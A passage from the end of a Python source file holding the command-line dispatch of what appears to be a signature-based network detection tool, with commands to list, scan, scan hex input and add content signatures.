            print("seeded", seed_baseline(det), "signatures")
        elif args.cmd == "list":
            for sid in sorted(det.sigs):
                s = det.sigs[sid]
                kind = "pcre" if s.is_pcre else "content"
                print("%-6d %-28s %-7s %-6s %s" % (
                    s.sid, s.name, kind, ACTION_NAME[s.action],
                    (s.pattern[:40] if not s.is_pcre else s.pattern)))
            print("total:", len(det.sigs))
        elif args.cmd in ("scan", "scan-hex"):
            data = (open(args.file, "rb").read() if args.cmd == "scan"
                    else binascii.unhexlify(args.hex))
            d = det.inspect(data)
            print(d.summary())
            for m in d.matches:
                print("  hit sid=%s %s method=%s off=%d -> %s" % (
                    m.sid, m.name, m.method, m.offset, ACTION_NAME[m.action]))
            if d.iocs and any(d.iocs.values()):
                print("  iocs:", {k: v for k, v in d.iocs.items() if v})
        elif args.cmd == "add":
            act = {"alert": ACTION_ALERT, "drop": ACTION_DROP, "reset": ACTION_RESET}[args.action]
            det.add_signature(ContentSignature(
                args.sid, args.name, binascii.unhexlify(args.hexpattern),
                action=act, source="cli"))
            print("added sig", args.sid)
    finally:
        if db is not None:
            db.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
